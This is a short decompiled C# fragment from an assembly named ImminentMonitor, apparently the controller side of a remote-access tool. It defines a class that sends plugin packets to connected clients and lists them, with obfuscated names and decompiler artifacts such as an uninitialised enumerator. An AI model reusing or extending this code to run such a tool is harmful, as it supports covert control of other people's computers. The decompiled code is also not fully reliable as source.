// Decompiled with JetBrains decompiler
// Type: GClass8
// Assembly: ImminentMonitor, Version=5.0.0.89, Culture=neutral, PublicKeyToken=null
// MVID: B073CE4A-B7A6-4CA1-871B-499EF3E27493
// Assembly location: C:\Users\Artem\Documents\Code\Imminent Monitor 5\Imminent Monitor.exe

using Imminent;
using Imminent.IServerVars;
using System.Collections.Generic;
using System.Runtime.CompilerServices;

public sealed class GClass8 : IServerNetworkActions
{
  public string string_0;

  public void SendToClient(IServerClient iserverClient_0, params object[] object_0)
  {
    GClass18 gclass18_0 = Class97.gclass21_0.method_59(iserverClient_0.IServerState.UID);
    if (gclass18_0 == null)
      return;
    List<object> objectList = new List<object>();
    objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PacketHeader.Plugin);
    objectList.Add((object) dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.PluginPacket.FromPlugin);
    objectList.Add((object) this.string_0);
    int num = object_0.Length - 1;
    for (int index = 0; index <= num; ++index)
      objectList.Add(RuntimeHelpers.GetObjectValue(object_0[index]));
    dje_zZ6SFP48AP27RN8Z788PXBKEEUH4SS7KQ4MJBGAK2EK9LM5Q_ejd.smethod_3(gclass18_0, objectList.ToArray());
  }

  public IServerClient[] GetClientList()
  {
    List<IServerClient> iserverClientList = new List<IServerClient>();
    try
    {
      foreach (GClass18 gclass18 in new List<GClass18>((IEnumerable<GClass18>) Class97.list_0))
        iserverClientList.Add(gclass18.method_22());
    }
    finally
    {
      List<GClass18>.Enumerator enumerator;
      enumerator.Dispose();
    }
    return iserverClientList.ToArray();
  }
}
